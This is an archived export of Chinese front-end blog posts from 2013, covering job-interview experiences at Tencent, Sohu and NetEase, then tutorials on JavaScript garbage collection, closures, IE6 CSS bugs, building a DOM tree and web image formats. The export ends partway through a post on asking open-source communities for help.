    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 笔试就不说了，说多了都是泪，选择题基本不会，幸好填空题和附加题都拿下了，貌似最后78分。 【一面】~=110分钟 &nbsp;2013/04/24 11:20 &nbsp;星期三进门静坐30分钟做题。填空题+大题+问答题&gt;&gt;填空题何时接触电脑 何时接触前端运算符 字符串处理 延时 display position XMLHttpRequest 正则Jquery绑定事件 cookie&gt;&gt;大题BOM浏览器信息浏览器兼容性举例闭包作用与举例新闻ul列表，插入3个，获取index全文单词首字母大写ajax过程&gt;&gt;逻辑题任何时间分针和时针夹角文章单词（字母）频率出现最高30分钟等到车概率是70%，那10分钟呢？一个班学舞蹈的有75%，学唱歌的有85%，问同时学习舞蹈和唱歌的最多多少，最少多少？两个很大数的加法运算&gt;&gt;我的提问为什么不问我框架你觉得我哪些方面还有欠缺，觉得我如何如果有望进入二面，什么时候可以得到通知&gt;&gt;完了之后一起下楼时我说其他几家公司的问题和腾讯的有比较大的区别，区别是XXXXXX然后他问我家在哪里然后说深圳还是比较适合我我说但愿还能见到你他笑了笑【二面】~=40分钟&nbsp;2013/04/25 14:00 &nbsp;星期四面试时间是两点钟，两点过几分进入了面试官所在的包间。进去之前楼下签到的hr要我把一摞草稿纸带到621房间的面试官，进门给他之后，他说那把大椅子是坏的，要我往后坐一点（防止向前倾倒）。开始的时候他没怎么说话，埋头看着我的简历，于是我主动开始扯了几句关于自己的介绍。也不知他听到没有，等我说完，马上又说：好吧，你先自我介绍下。（一脸黑线…）期间问了我为什么不打算考研，为什么选择前端，我做的最自豪的事情是什么。叽哩吧啦一阵子后，他要我说说我的人生规划和职业规划（颇为蛋疼，这些问题不是应该HR面才会问的么），我顺着他的来，也比较xx的说了一番。反向代理输入网址到出现页面的过程（IP解析，DNS解析等）页面流量堆栈接着，问了我-1在计算机中怎么表示，如何判断数组A是否为数组B的子集。然后是一个概率问题，假设长江以北有80W人，长江以南有20W人，A向B打电话算一个电话，如果打了10W个电话，那么长江以北打向长江以南的电话有多少个？没问太多问题，都是些基础的，最后他问我有什么问题。&gt;&gt;我问了问为什么不问我前端的问题如果通过二面，什么时候可以给我回复对我有什么学习上的建议面试官留言：\一把刀有刀锋和刀背，刀锋要磨锐利，但是刀背的锻炼也要加强。” 【HR面】~=30分钟 2013/04/27 20:00 星期六进去先看上几位面试官对我的评价，安静时刻我跟她扯淡了几句，缓和了下尴尬的气氛。然后她瞄了瞄我的简历，接着就问我考不考研，很明显我的答案是不。然后她又问为什么~接着让我说说自己最满意的一件事和最不满意的一件事，自己最大的缺点和最大的优点扯了半天之后（此处略去20分钟扯淡），又开始看我的简历，问了我项目中遇到哪些困难，我说了一个还未解决的bug，她反问为什么不解决，然后叽哩吧啦了一阵子。最后问我有没有什么问题。按惯例，问了问最早什么时候给通知，然后问了问期间如果有不明白问题可以通过什么方式联系她之类的。整个过程还算顺利。 HR告诉我五一之后可以查询录取状态，求人品吧~ 顺便把在搜狐和网易的面试笔试经历也说说吧~&gt;&gt;搜狐搜狐的太久了，记不太清楚了那次只为攒经验，是俺平生第一次参加公司面试。不过收获还是有的~时间太久了，也记不清了，没有提交笔试题，但是还是要我去面试了。问他有几轮面试，告诉我因时间匆忙，只给一轮技术面，如果满意直接HR。大概问题记不太清。虽然感觉答的还不错，但是最后还是被刷了。【技术面】~=60分钟-问了下我在团队学了些什么。 -然后就是很多\你是怎么理解XX”。。-XX中有 闭包，原型链， 框架结构等 &gt;&gt;网易今天4.27，好像是3.26参加的面试，时间太久，也记得不是很清楚了。我没有把任何面试官当做正经的面试官，男的就是我的学长，女的就是我的学姐，仅此而已，所以每次交流都是平和的心态。学长们（每次面我的都是个男的）时不时露出笑意，现场气氛没有那么紧张。【一面】 ~=30分钟闭包IE6趋势框架【二面】 ~=90分钟框架比较 jQuery prototype YUI框架特点css兼容性 IE6 bugseaJS AMD CMD kissyJS原型链 闭包JS基础细节不让谈百度框架【HR面】~=25分钟自我介绍身边人的评价最不满意的一件事情规划为什么不想考研有什么困难薪资待遇何时通知]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>腾讯面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript垃圾回收机制]]></title>
    <url>%2Fblog%2F2013%2F04%2F27%2F2013-04-27-cb-garbage-collection%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 一、垃圾回收的必要性 下面这段话引自《JavaScript权威指南（第四版）》 由于字符串、对象和数组没有固定大小，所有当他们的大小已知时，才能对他们进行动态的存储分配。JavaScript程序每次创建字符串、数组或对象时，解释器都必须分配内存来存储那个实体。只要像这样动态地分配了内存，最终都要释放这些内存以便他们能够被再用，否则，JavaScript的解释器将会消耗完系统中所有可用的内存，造成系统崩溃。 这段话解释了为什么需要系统需要垃圾回收，JS不像C/C++，他有自己的一套垃圾回收机制（Garbage Collection）。JavaScript的解释器可以检测到何时程序不再使用一个对象了，当他确定了一个对象是无用的时候，他就知道不再需要这个对象，可以把它所占用的内存释放掉了。例如： 123var a = &quot;before&quot;;var b = &quot;override a&quot;;var a = b; //重写a 这段代码运行之后，\before”这个字符串失去了引用（之前是被a引用），系统检测到这个事实之后，就会释放该字符串的存储空间以便这些空间可以被再利用。 二、垃圾回收原理浅析 现在各大浏览器通常用采用的垃圾回收有两种方法：标记清除、引用计数。1、标记清除 这是javascript中最常用的垃圾回收方式。当变量进入执行环境是，就标记这个变量为\进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到他们。当变量离开环境时，则将其标记为\离开环境”。 垃圾收集器在运行的时候会给存储在内存中的所有变量都加上标记。然后，它会去掉环境中的变量以及被环境中的变量引用的标记。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后。垃圾收集器完成内存清除工作，销毁那些带标记的值，并回收他们所占用的内存空间。关于这一块，建议读读Tom大叔的几篇文章，关于作用域链的一些知识详解，读完差不多就知道了，哪些变量会被做标记。2、引用计数 另一种不太常见的垃圾回收策略是引用计数。引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型赋值给该变量时，则这个值的引用次数就是1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数就减1。当这个引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其所占的内存空间给收回来。这样，垃圾收集器下次再运行时，它就会释放那些引用次数为0的值所占的内存。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是用这种方法存在着一个问题，下面来看看代码： 1234567function problem() &#123; var objA = new Object(); var objB = new Object(); objA.someOtherObject = objB; objB.anotherObject = objA;&#125; 在这个例子中，objA和objB通过各自的属性相互引用；也就是说这两个对象的引用次数都是2。在采用引用计数的策略中，由于函数执行之后，这两个对象都离开了作用域，函数执行完成之后，objA和objB还将会继续存在，因为他们的引用次数永远不会是0。这样的相互引用如果说很大量的存在就会导致大量的内存泄露。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们知道，IE中有一部分对象并不是原生JavaScript对象。例如，其BOM和DOM中的对象就是使用C++以COM（Component Object&nbsp;Model，组件对象）对象的形式实现的，而COM对象的垃圾回收器就是采用的引用计数的策略。因此，即使IE的Javascript引擎使用标记清除的策略来实现的，但JavaScript访问的COM对象依然是基于引用计数的策略的。说白了，只要IE中涉及COM对象，就会存在循环引用的问题。看看下面的这个简单的例子： 1234var element = document.getElementById(&quot;some_element&quot;);var myObj =new Object();myObj.element = element;element.someObject = myObj; 上面这个例子中，在一个DOM元素(element)与一个原生JavaScript对象(myObj)之间建立了循环引用。其中，变量myObj有一个名为element的属性指向element；而变量element有一个名为someObject的属性回指到myObj。由于循环引用，即使将例子中的DOM从页面中移除，内存也永远不会回收。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不过上面的问题也不是不能解决，我们可以手动切断他们的循环引用。 12myObj.element = null;element.someObject =null; 这样写代码的话就可以解决循环引用的问题了，也就防止了内存泄露的问题。 三、减少JavaScript中的垃圾回收 首先，最明显的，new关键字就意味着一次内存分配，例如 new Foo()。最好的处理方法是：在初始化的时候新建对象，然后在后续过程中尽量多的重用这些创建好的对象。另外还有以下三种内存分配表达式（可能不像new关键字那么明显了）：{} （创建一个新对象）[] （创建一个新数组）function() {…} (创建一个新的方法，注意：新建方法也会导致垃圾收集！！)1、对象object优化 为了最大限度的实现对象的重用，应该像避使用new语句一样避免使用{}来新建对象。 {\foo”:”bar”}这种方式新建的带属性的对象，常常作为方法的返回值来使用，可是这将会导致过多的内存创建，因此最好的解决办法是：每一次函数调用完成之后，将需要返回的数据放入一个全局的对象中，并返回此全局对象。如果使用这种方式，就意味着每一次方法调用都会导致全局对象内容的修改，这有可能会导致错误的发生。因此，一定要对此全局对象的使用进行详细的注释和说明。 有一种方式能够保证对象（确保对象prototype上没有属性）的重复利用，那就是遍历此对象的所有属性，并逐个删除，最终将对象清理为一个空对象。 cr.wipe(obj)方法就是为此功能而生，代码如下：&nbsp;1234567// 删除obj对象的所有属性，高效的将obj转化为一个崭新的对象！cr.wipe = function (obj) &#123; for (var p in obj) &#123; if (obj.hasOwnProperty(p)) delete obj[p]; &#125;&#125;; 有些时候，你可以使用cr.wipe(obj)方法清理对象，再为obj添加新的属性，就可以达到重复利用对象的目的。虽然通过清空一个对象来获取\新对象”的做法，比简单的通过{}来创建对象要耗时一些，但是在实时性要求很高的代码中，这一点短暂的时间消耗，将会有效的减少垃圾堆积，并且最终避免垃圾回收暂停，这是非常值得的！2、数组array优化 将[]赋值给一个数组对象，是清空数组的捷径（例如： arr = [];），但是需要注意的是，这种方式又创建了一个新的空对象，并且将原来的数组对象变成了一小片内存垃圾！实际上，将数组长度赋值为0（arr.length = 0）也能达到清空数组的目的，并且同时能实现数组重用，减少内存垃圾的产生。 3、方法function优化 方法一般都是在初始化的时候创建，并且此后很少在运行时进行动态内存分配，这就使得导致内存垃圾产生的方法，找起来就不是那么容易了。但是从另一角度来说，这更便于我们寻找了，因为只要是动态创建方法的地方，就有可能产生内存垃圾。例如：将方法作为返回值，就是一个动态创建方法的实例。 在游戏的主循环中，setTimeout或requestAnimationFrame来调用一个成员方法是很常见的，例如：123456setTimeout( (function(self) &#123; return function () &#123; self.tick(); &#125;;&#125;)(this), 16) 每过16毫秒调用一次this.tick()，嗯，乍一看似乎没什么问题，但是仔细一琢磨，每一次调用都返回了一个新的方法对象，这就导致了大量的方法对象垃圾！ 为了解决这个问题，可以将作为返回值的方法保存起来，例如：1234567891011// at startupthis.tickFunc = ( function(self) &#123; return function() &#123; self.tick(); &#125;; &#125;)(this);// in the tick() functionsetTimeout(this.tickFunc, 16); 相比于每次都新建一个方法对象，这种方式在每一帧当中重用了相同的方法对象。这种方式的优势是显而易见的，而这种思想也可以应用在任何以方法为返回值或者在运行时创建方法的情况当中。 4、高级技术 从根本上来说，javascript本身就是围绕着垃圾收集来设计的。随着我们工作的进行，避免内存垃圾变得越来越困难。因为很多方便实用的Javascript库方法也会产生一些新的对象。对于这些库方法产生的垃圾，我们束手无策，只能重新翻看文档，并且检查方法的返回值。例如，数组的slice方法返回一个新的数组（在不修改原数组的基础上，截取出一部分作为新数组），字符串的substr方法返回一个新的字符串（在不修改原字符串的基础上，截取出一部分字符串作为返回值）等等。 调用这些库方法，将会创建内存垃圾，而你能做的，只有避免调用这些方法，或者用不创建系统垃圾的方式重写这些方法（有点极端啦~）。 例如，在Construct 2引擎中，从数组中利用下标来删除一个元素，是经常进行的操作。最初我们是用下面这种方式来实现的：123var sliced = arr.slice(index + 1);arr.length = index;arr.push.apply(arr, sliced); 然而，slice方法会返回一个新的数组对象（数组中的元素是原数组中删掉的部分），并且会通过arr.push.apply方法将元素重新复制回原数组，但是在此操作之后，该数组就成为了一片内存垃圾。由于这是我们引擎中的垃圾产生的热点代码（使用频率非常很高），因此我们利用了迭代的方式重写了上述代码：123for (var i = index, len = arr.length – 1; i &lt; len; i++) arr[i] = arr[i + 1];arr.length = len; 显然，重写大量的库函数是非常痛苦的，因此你必须仔细权衡方法的易用性和内存垃圾产生情况。如果产生大量内存垃圾的方法在动画的每一帧中被多次调用，你可能就会兴高采烈的重写库函数啦。 在递归函数中，通过{}构造空对象，并在递归过程中传递数据，虽然是很方便的。但是更好的方式是：利用一个单独的数组对象作为堆栈，在递归过程中对数组进行push和pop操作。更进一步，不要调用array的pop方法（pop将会使得array的最后一个元素将会变成内存垃圾），而应该使用一个索引来记录数组的最后一个元素的位置，在pop时简单的将索引减一即可；类似的，将索引加1来代替array的push操作，只有当索引对应的元素不存在时，才执行真正的push为数组加入一个新元素。 另外，在任何时候，都应该避免使用向量对象（例如：包含x和y属性的vector2对象）。有些方法将向量对象作为方法返回值，既可以支持返回值的再次修改，又能够将需要的属性一次性返回，使用起来非常方便。但是有时候在一帧动画中，创建了成百上千个这样的向量对象，从而导致严重的垃圾回收性能问题，也是非常常见的。因此最好将这些方法分离成具有独立职责的功能个体，例如：利用getX()和getY()方法（返回具体数据）代替getPosition()方法（返回一个vector2对象）。 四、总结 在Javascript中，彻底避免垃圾回收是非常困难的。垃圾回收机制与实时软件（例如：游戏）的实时性要求，从根本上就是对立的。 但是，为了减少内存垃圾，我们还是可以对javascript代码进行彻底检查，有些代码中存在明显的产生过多内存垃圾的问题代码，这些正是我们需要检查并且完善的。 我认为，只要我们投入更多的精力和关注，实现实时的、低垃圾收集的javascript应用还是很有可能的。毕竟，对于可交互性要求较高的游戏或应用来说，实时性和低垃圾收集，两者都是至关重要。 五、参考资料 1.&nbsp;人人FED 2.&nbsp;Jeff Wong 3. 《JavaScript权威指南(第四版)》]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>垃圾回收</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS闭包的用途]]></title>
    <url>%2Fblog%2F2013%2F04%2F24%2F2013-04-24-cb-javascript-closure-usages%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 我们来看看闭包的用途。事实上，通过使用闭包，我们可以做很多事情。比如模拟面向对象的代码风格；更优雅，更简洁的表达出代码；在某些方面提升代码的执行效率。1. 匿名自执行函数我们知道所有的变量，如果不加上var关键字，则默认的会添加到全局对象的属性上去，这样的临时变量加入全局对象有很多坏处，比如：别的函数可能误用这些变量；造成全局对象过于庞大，影响访问速度(因为变量的取值是需要从原型链上遍历的)。除了每次使用变量都是用var关键字外，我们在实际情况下经常遇到这样一种情况，即有的函数只需要执行一次，其内部变量无需维护，比如UI的初始化，那么我们可以使用闭包： 123456789101112131415var datamodel = &#123; table : [], tree : &#123;&#125;&#125;;(function(dm)&#123; for(var i = 0; i &lt; dm.table.rows; i++)&#123; var row = dm.table.rows[i]; for(var j = 0; j &lt; row.cells; i++)&#123; drawCell(i, j); &#125; &#125; //build dm.tree &#125;)(datamodel); 我们创建了一个匿名的函数，并立即执行它，由于外部无法引用它内部的变量，因此在执行完后很快就会被释放，关键是这种机制不会污染全局对象。2.缓存再来看一个例子，设想我们有一个处理过程很耗时的函数对象，每次调用都会花费很长时间，那么我们就需要将计算出来的值存储起来，当调用这个函数的时候，首先在缓存中查找，如果找不到，则进行计算，然后更新缓存并返回值，如果找到了，直接返回查找到的值即可。闭包正是可以做到这一点，因为它不会释放外部的引用，从而函数内部的值可以得以保留。 1234567891011121314151617181920212223var CachedSearchBox = (function()&#123; var cache = &#123;&#125;, count = []; return &#123; attachSearchBox : function(dsid)&#123; if(dsid in cache)&#123;//如果结果在缓存中 return cache[dsid];//直接返回缓存中的对象 &#125; var fsb = new uikit.webctrl.SearchBox(dsid);//新建 cache[dsid] = fsb;//更新缓存 if(count.length &gt; 100)&#123;//保正缓存的大小&lt;=100 delete cache[count.shift()]; &#125; return fsb; &#125;, clearSearchBox : function(dsid)&#123; if(dsid in cache)&#123; cache[dsid].clearSelection(); &#125; &#125; &#125;; &#125;)(); CachedSearchBox.attachSearchBox(“input1”); 这样，当我们第二次调用CachedSearchBox.attachSerachBox(\input1”)的时候，我们就可以从缓存中取道该对象，而不用再去创建一个新的searchbox对象。3.实现封装可以先来看一个关于封装的例子，在person之外的地方无法访问其内部的变量，而通过提供闭包的形式来访问： 123456789101112131415161718192021222324var person = function()&#123; //变量作用域为函数内部，外部无法访问 var name = &quot;default&quot;; return &#123; getName : function()&#123; return name; &#125;, setName : function(newName)&#123; name = newName; &#125; &#125;&#125;();print(person.name);//直接访问，结果为undefined print(person.getName());person.setName(&quot;abruzzi&quot;);print(person.getName());得到结果如下：undefineddefaultabruzzi 4. 闭包的另一个重要用途是实现面向对象中的对象，传统的对象语言都提供类的模板机制这样不同的对象(类的实例)拥有独立的成员及状态，互不干涉。虽然JavaScript中没有类这样的机制，但是通过使用闭包，我们可以模拟出这样的机制。还是以上边的例子来讲： 1234567891011121314151617181920212223242526272829function Person()&#123; var name = &quot;default&quot;; return &#123; getName : function()&#123; return name; &#125;, setName : function(newName)&#123; name = newName; &#125; &#125;&#125;;var john = Person();print(john.getName());john.setName(&quot;john&quot;);print(john.getName());var jack = Person();print(jack.getName());jack.setName(&quot;jack&quot;);print(jack.getName());运行结果如下：defaultjohndefaultjack 由此代码可知，john和jack都可以称为是Person这个类的实例，因为这两个实例对name这个成员的访问是独立的，互不影响的。 当然，除此之外，从不同的角度来看待闭包，他的作用也可以有不同的说法。闭包可以防止变量重名，保证变量不污染全局闭包可以创建私有变量和私有方法闭包可以….本文参考：sunlylorn的专栏]]></content>
      <categories>
        <category>JavaScript</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>JavaScript闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6 bug集]]></title>
    <url>%2Fblog%2F2013%2F04%2F24%2F2013-04-24-cb-ie6-bugs%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 1.IE6的3像素偏移BUG&nbsp;&nbsp;&nbsp; 当浮动元素与非浮动元素相邻（注意这里的相邻可以是纵向的也可以是横向的）时，这个3像素的Bug就会出现，它会偏移3像素。实际表现就是两个元素之间产生了一道缝隙！解决方法很简单，将两个元素都浮动就OK了。此BUG深层的原因是非浮动元素的layout未触发，所以这里只要是能够触发layout的css都可以解决问题。 2.IE6 双倍边距问题&nbsp;&nbsp;&nbsp; 当浮动元素设置margin边距时，边距会加倍。解决方法是给浮动元素加上display：inline属性。 3.IE6下空标签高度问题&nbsp;&nbsp;&nbsp; 当你把标签的高度设置为0-19内的数字时，IE6会一致的显示为19px高。解决方法：给标签加上overflow：hidden。 4.IE6图片下方有空隙产生&nbsp; &nbsp;css代码： 12345678div &#123; border:1px solid red; background:orange;&#125;img &#123; width:276px; height:110px;&#125; HTML代码： 123&lt;div&gt; &lt;img src=&quot;....&quot; alt=&quot;google&quot;&gt;&lt;/div&gt; 解决办法是：img｛display：block；}5.IE6,7失效的margin-left/right bugHTML代码： 123&lt;div class=&quot;wrap&quot;&gt; &lt;div class=&quot;cont&quot;&gt;www.hemin.cn&lt;/div&gt;&lt;/div&gt; CSS代码： 12wrap&#123;background:#eee;border:1px solid #ccc;&#125;cont&#123;border-bottom:2px solid #aaa;margin:0 100px;height:30px;&#125; 解决方法：触发.warp的layout就可以了。具体的比如：给.warp加上zoom:1或者width等等。6. IE6 幽灵文本(Ghost Text bug)在我写本文之前，我遇到了这个bug。它相当的古怪和滑稽。一块不知哪来的重复的文本，被IE6显示在靠近原文本的下面。(译注：也可以参看Explorer 6 Duplicate Characters Bug获得bug演示)。我无法解决它，所以我搜索它，果然，这是另一个IE6的bug。对此有许多解决方法，但是没有一个对我的例子有效(因为网站的复杂性我无法使用其中的一些方法)。所以我使用了hack。在原文本之后增加空格看起来能解决这个问题。但是，从Hippy Tech Blog那里了解到，问题背后的原因是由于html注释标签。IE6不能正确的渲染它。下面是他建议的解决方案列表： 使用&lt;!&mdash;[IF !IE]&gt;标签包围注释 移除注释 在前浮动上增加样式 {display:inline;} 在适当的浮动的div上使用负边距 在原文本增加额外的]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>兼容性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS动态构建一棵目录树]]></title>
    <url>%2Fblog%2F2013%2F04%2F22%2F2013-04-22-cb-make-a-tree%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 在使用frameset布局的时候，经常会用到目录树，我们可以把一棵树写死，但是更多的情况是，这棵树需要随时被改动，所以我们期望的是他能够被动态的构建。MVC，算是了解一点，那本文就把这棵树根据M-V-C给拆开分解吧。点击链接demo→下面就来看看这棵树是怎么构建的。 Module [数据层]1234567891011121314151617181920212223242526var tree = &#123; &quot;id&quot;: 0, &quot;a1&quot;: &#123; &quot;id&quot;: 1, &quot;name&quot;: &quot;a1&quot;, &quot;children&quot;: &#123; &quot;b1&quot;: &quot;b1_1&quot;, &quot;b2&quot;: &quot;b1_2&quot;, &quot;b3&quot;: &quot;b1_3&quot; &#125; &#125;, &quot;a2&quot;: &#123; &quot;id&quot;: 1, &quot;name&quot;: &quot;a2&quot;, &quot;children&quot;: &#123;&#125; &#125;, &quot;a3&quot;: &#123; &quot;id&quot;: 1, &quot;name&quot;: &quot;a3&quot;, &quot;children&quot;: &#123; &quot;b1&quot;: &quot;b3_1&quot;, &quot;b2&quot;: &quot;b3_2&quot;, &quot;b3&quot;: &quot;b3_3&quot; &#125; &#125; &#125;;这是一颗两层的目录树，用ID来表示层级关系，name来表示改层的名字（也就是节点Text内容吧）。 Control [控制层] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566var Tree = function ( module )&#123; function createNodeList( obj ) &#123; //创建ul节点和documentFragmeng中间变量 var n = document.createElement(&quot;ul&quot;), docfrag = document.createDocumentFragment(); //判断obj是根节点还是孩子节点 if(obj.id == 0) &#123; n.setAttribute(&quot;class&quot;, &quot;tree_0&quot;); for(var key in obj) &#123; if(key == &quot;id&quot;) continue; //将节点插入 var c = document.createElement(&quot;li&quot;), span = document.createElement(&quot;span&quot;); span.appendChild(document.createTextNode( obj[key].name )); c.appendChild(span); docfrag.appendChild( c ); &#125; &#125;else if(obj.id &amp;&amp; obj.id == 1) &#123; n.setAttribute(&quot;class&quot;, &quot;tree_1&quot;); for(var key in obj) &#123; if(key == &quot;id&quot; || key == &quot;name&quot; || !obj.children) continue; for( var item in obj.children)&#123; //将节点插入 var c = document.createElement(&quot;li&quot;); c.appendChild(document.createTextNode( obj.children[item] )); docfrag.appendChild( c ); &#125; &#125; &#125; n.appendChild( docfrag ); //返回开始构建的ul节点 return n; &#125; //隐藏及显示 工具函数 function toggle(c)&#123; c.style.display = ((c.style.display == &quot;none&quot;) ? &quot;&quot; : &quot;none&quot;); &#125; function createTree( obj ) &#123; var root, child, count = 0; root = createNodeList( obj ); for(var key in obj)&#123; if(obj[key] == &quot;id&quot; || !obj[key].children) continue; child = createNodeList(obj[key]); root.children[count].appendChild( child ); //count来判断插入的位置 count++; &#125; return root; &#125; var T = createTree(module); var list = T.children; for(var i = 0, len = list.length; i &lt; len; i++)&#123; list[i].getElementsByTagName(&quot;span&quot;)[0].onclick = function()&#123; var obj = this.nextSibling; toggle(obj); &#125; &#125; return T;&#125; 这里边创建了三个函数，其中 1createNodeList() //适用于构建一个树子节点 其中使用documentFragment作为一个节点缓存器，先把节点放置到documentFragment中，然后统一插入到ul，这也是比较常用的使用方式。 1createTree() //构建一棵树 基本整棵树的构建就是分为这两步，前者负责创建一个子节点，后者构建一棵树。在这颗树中绑定了click事件，让其可以折叠，当然也可以在Tree这个类里绑定更多的方法，这个就靠自己发挥了。 View [视图层] 1234window.onload = function()&#123; var T = new Tree(tree); document.getElementsByTagName(&quot;body&quot;)[0].appendChild(T);&#125; 整棵树的构建，主要用到的是DOM元素的处理，这个必须牢牢掌握！]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最受欢迎的几种图片格式及其常见用法]]></title>
    <url>%2Fblog%2F2013%2F04%2F22%2F2013-04-22-cb-category-of-picture%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 从某种程度上说，判断一个网页设计师是否优秀，可以从其在WEB开发（或网页设计）中是否合理的采用各种图片格式得出结论。事实上，或许所有人都知道图片存在GIF,JPG和PNG等格式，但并非所有人都知道它们之间的具体区别和使用技巧。 接下来，将给大家介绍：WEB开发中几种最受欢迎图片格式的前世今生以及如何正确的使用它们。JPEG JPEG格式是一种大小与质量相平衡的压缩图片格式。通俗一点讲，就是：高的压缩比=低的图片质量=小的文件大小。反之，低的压缩比=高的图片质量=大的文件大小。由于JPEG文件无法保持100 ％的原始图像的像素数据，所以它不被认为是一种无损图像格式。用途： 由于这种极其敏感的平衡特性，JPEG非常适合被应用在那些允许轻微失真的像素色彩丰富的图片（照片）场合。反之，JPEG格式图片并不适合做简单色彩（色调少）的图片，比如LOGO，各种小图标（ICONS）。 GIF GIF格式，是为使图片能够应用在在线（online）应用程序上所特别开发的图片格式。Gif，有时也被成为\Giff”，是一种无损，8位图片格式。\无损”是指100%的保持原始图片的像素数据信息。专业名词\8位”是指，所能表现的颜色深度&mdash;&mdash;一个8位图像仅最多只能支持256种不同颜色（一个多余256种颜色的图片若用gif图片保存会出现失真）。用途： 由于8位颜色深度的限制，Gif不适合应用于各种色彩过于丰富的照片存储场合。但它却非常适合应用在以下场合：Logo小图标（Icon）用于布局的图片（例如某个布局角落，边框等等）仅包含不超过256种色彩的简单，小型图片场合透明特性： GIF支持基本的透明特性，这意味着你能够使图片的某些像素\不可见”。在其被放置到网页中时，我们就可以看到通过这些不可见区域看到此图片后面的背景颜色（图片）。此特性非常有用：如果你需要将某个gif图片的内容置于所有图片的上层，你可以将其设置为透明。压缩特性： GIF格式采用LZW算法进行压缩，此算法是Unisys申请的一项专利。在很久很久之前，如果你想使用GIF格式，那么就意味着你需要向Unisys付费申请专利许可。不过值得高兴的是，此项专利技术已于2003年6月20日过期，我们现在可以免费的使用GIF了！隔行扫描： GIF同时也支持隔行扫描。隔行扫描能够令图片在浏览器中更快的加载和显示。此特性对于那些慢网速的浏览者来说尤其实用。动画GIF： 一个动态的GIF文件，是由若干帧图片所联结而成的动态图片。在显示时，这些动态帧被反复的绘制读取出来从而形成了简单的动画效果。合理的运用GIF动画能够为网页增添动静结合的效果，而过度的使用则会使网页杂乱无章。 PNG PNG，读\ping”，初始时被作为GIF的免费替代格式所开发，采用公共专利压缩算法。PNG格式也是一种无损压缩，但与GIF格式不同的是，PNG同时支持8位和24位的图像。8位PNG图像： 一个8位PNG图片，支持透明背景且像素颜色不能超过256种。除了压缩算法不同之外，此8位PNG格式与GIF格式极其相似；用途： 8位PNG图片的用途与GIF格式基本相同，Logo小图标（Icon）用于布局的图片（例如某个布局角落，边框等等）仅包含不超过256种色彩的简单，小型图片场合24位PNG图像： 24位PNG，支持160万种不同的像素颜色且支持Alpha透明效果，这就意味着，无论透明度设置为多少，PNG图片均能够与背景很好的融合在一起。对PNG的支持： 由于PNG格式的广泛使用和开发者更加重视网页的WEB标准，不同浏览器对PNG的支持就显得相当重要了。不过，幸运的是，目前市场上主流的浏览器对PNG格式都有很好的支持，这包括：IE*, Firefox, Safari, Opera, and Konqueror。 但不幸的是，IE6及IE6以下的浏览器对PNG透明背景的支持并不好。不过我们仍可以通过其他方法来解决这个问题，详情请查看如何在IE6中正常显示透明PNG。]]></content>
      <categories>
        <category>剪贴板</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何向开源社区提问题]]></title>
    <url>%2Fblog%2F2013%2F04%2F22%2F2013-04-22-cb-how-to-ask-quertion%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 大家提问题前，请仔细阅读下这篇文章。高质量的提问，不光有助于问题的快速解决，还能赢得社区的尊重。如何向开源社区提问题使用软件产品，或多或少都会遇到问题。对于商业产品，我们可以咨询客服寻求帮助。对于公司自己研发的产品，我们可以直接请教专家同事。但对于开源软件，在遇到问题时，如何才能及时有效地寻求帮助呢？本文以开源类库&nbsp;Sea.js&nbsp;为例，说说我心目中的最佳实践。提问前遇到问题时，心里都很着急。在决定向开源社区提交问题前，最好先做做以下功课：尝试从官方文档中找到答案确保自己阅读过至少一次官方文档。这样在遇到问题时，如果能回忆起只言片语，就可以再去读一遍相关文档，问题往往也就解决了。Google 是你的朋友对于成熟的开源项目，你遇到的问题，很可能别人也遇到过。这时通过 Google、StackOverflow 等网站的搜索服务，可以帮你快速定位并解决问题。永远记住，地球上的你并不孤单，包括你遇到的问题。挖掘 Bug 宝藏开源软件一般都会有自己的 Bug 管理方案，比如 WebKit、V8、jQuery、Sea.js 等等。从它们的官网上找到 Bug 管理地址，然后通过搜索看看有无你遇到的问题。对于活跃社区来说，这一招经常很管用。比如 jQuery 的&nbsp;Bug Tracker，通过右上角的 Search Tickets 可以找到非常多有用的信息。一个运作良好的 Bug 库，经常是一座巨大的宝藏。Sea.js 是直接通过&nbsp;GitHub Issues&nbsp;来管理，你可以在 Issues 